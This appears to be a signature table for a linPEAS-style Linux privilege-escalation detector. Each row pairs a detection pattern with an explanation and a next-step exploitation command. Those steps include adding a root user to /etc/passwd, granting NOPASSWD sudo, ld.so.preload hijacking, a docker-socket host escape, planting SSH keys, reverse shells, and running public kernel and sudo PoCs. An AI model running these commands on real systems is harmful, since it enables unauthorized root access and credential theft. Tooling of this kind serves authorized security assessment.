column1: # Linux privilege-escalation signatures for the linprivesc detector (the linPEAS counterpart to
# windows_signatures.tsv). These cover the HackTricks Linux checklist items that the structured
# detectors do NOT already handle - sudo -l, SUID, capabilities, cron, kernel CVEs and
# passwd/shadow parsing are each their own detector, so this file deliberately avoids them and
# focuses on writable-sensitive-files, NFS, containers, keys, creds, and the CVE tags linPEAS
# pattern is a case-insensitive Java regex matched against each (colour-stripped) line. Add rows.
# id                pattern    severity  category  title  meaning  next

column6: meaning
column7: next

column6: You can edit the account database directly - add a second root user, or blank root's password field.
column7: echo 'pwn:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd ; su pwn   (checklist: writable sensitive files)

column6: You can set any password hash - put a known one on root's line.
column7: openssl passwd -6 pass ; edit root's hash in /etc/shadow ; su   (checklist: writable sensitive files)

column6: Every password hash is exposed to offline cracking.
column7: unshadow /etc/passwd /etc/shadow > h ; hashcat -m 1800 h wordlist   (checklist: readable shadow)

column6: You can grant yourself passwordless root.
column7: echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/x ; sudo -i   (checklist: writable sudoers)

column6: A unit that runs as root and that you can edit - point ExecStart at your payload.
column7: set ExecStart=/tmp/x ; systemctl daemon-reload ; systemctl start <unit>   (checklist: writable service files)

column6: Runs as root at boot (or on service start); your code goes with it.
column7: append a reverse shell / SUID drop to the script   (checklist: startup / init)

column6: If this file is writable, a library you name in it is loaded into EVERY process, root included. Confirm write access.
column7: echo /tmp/evil.so > /etc/ld.so.preload   (checklist: ld.so.preload / library hijack)

column6: Add a directory holding a malicious library that a SUID/root binary will load.
column7: add a path ; ldconfig ; hijack a needed lib   (checklist: library hijack)

column6: A PATH directory you can write to lets you shadow a command a root process runs by name.
column7: drop a binary named like the command an unquoted/relative call uses   (checklist: writable PATH)

column6: A cron job's script or directory that you can edit - it runs on schedule as its owner (often root).
column7: replace the script body ; wait for the next tick   (checklist: cron)

column6: Root on the client stays root on the share. From a box you control, drop a SUID-root binary into the export and run it here.
column7: mount -o rw <host>:/share /mnt ; cp /bin/bash /mnt/x ; chmod +s /mnt/x ; /share/x -p   (checklist: NFS no_root_squash)

column6: Check the export options - no_root_squash and insecure are the dangerous ones.
column7: showmount -e <host> ; read /etc/exports   (checklist: NFS)

column6: Talking to the Docker daemon is root on the host - it runs as root and will mount the host filesystem for you.
column7: docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh   (checklist: docker socket)

column2: (/\.dockerenv|you are inside a container|inside a docker container|running in a container)
column6: You are in a container - the escape targets are host mounts, the docker socket, and excess capabilities.
column7: look for -v host mounts, /var/run/docker.sock, CAP_SYS_ADMIN   (checklist: containers)

column6: With every capability you can mount host block devices and reach the host filesystem directly.
column7: mount /dev/sda1 /mnt ; chroot /mnt   (checklist: privileged container)

column6: A private key on disk may unlock this host's other users or entirely different machines.
column7: chmod 600 key ; ssh -i key user@host ; check authorized_keys reuse   (checklist: SSH keys)

column6: Append your own public key and log straight in as that user.
column7: echo "<your pubkey>" >> ~victim/.ssh/authorized_keys ; ssh victim@host   (checklist: SSH keys)

column6: History files often record passwords typed on the command line.
column7: grep -iE 'pass|token|-p ' <file>   (checklist: passwords in history)

column6: An env var appears to hold a password/key/token in cleartext.
column7: note the value ; try it for reuse (sudo, ssh, db)   (checklist: env vars)

column2: mysql.{0,25}(without a? ?password|no password|as root with no|-u\s*root\s*($|\s-e))
column5: MySQL reachable as root without a password
column6: A local root MySQL with no password is a credential store and, via UDF, command execution.
column7: mysql -u root ; then dump creds or load a UDF for exec   (checklist: databases)

column6: yama ptrace_scope=0 lets you attach to other processes of your user - dump their memory for credentials.
column7: gdb -p <pid> / read /proc/<pid>/mem ; mine for passwords   (checklist: memory password mining)

column6: A multiplexer socket owned by another (often root) user lets you attach to their live session.
column7: tmux -S <socket> attach   (checklist: user sessions)

column6: A memory-corruption bug in pkexec giving local root on essentially every unpatched polkit. One-shot public exploits.
column7: confirm pkexec/polkit < 0.120, then run a PwnKit PoC   (checklist: kernel/pkexec exploits)

column6: A D-Bus timing bug lets an unprivileged user create a new privileged account.
column7: needs polkit + accountsservice ; use the public PoC   (checklist: pkexec/polkit)

column6: Overwrite read-only files (a SUID binary, /etc/passwd) to get root. Kernels 5.8 - 5.16.x. The kernel detector also matches this by version.
column7: confirm the kernel build, run a Dirty Pipe PoC   (checklist: kernel exploits)

column6: The classic copy-on-write race to root on older kernels.
column7: confirm the kernel build, run a Dirty COW PoC   (checklist: kernel exploits)

column6: A sudo heap overflow giving root from any local user. sudo 1.8.2 - 1.9.5p1. The sudo detector also matches this by version.
column7: confirm the sudo version, run a Baron Samedit PoC   (checklist: sudo version)

column6: A buffer overflow in glibc's ld.so GLIBC_TUNABLES handling, local root on many 2023-era distros.
column7: confirm the glibc version, run a Looney Tunables PoC   (checklist: kernel/libc exploits)
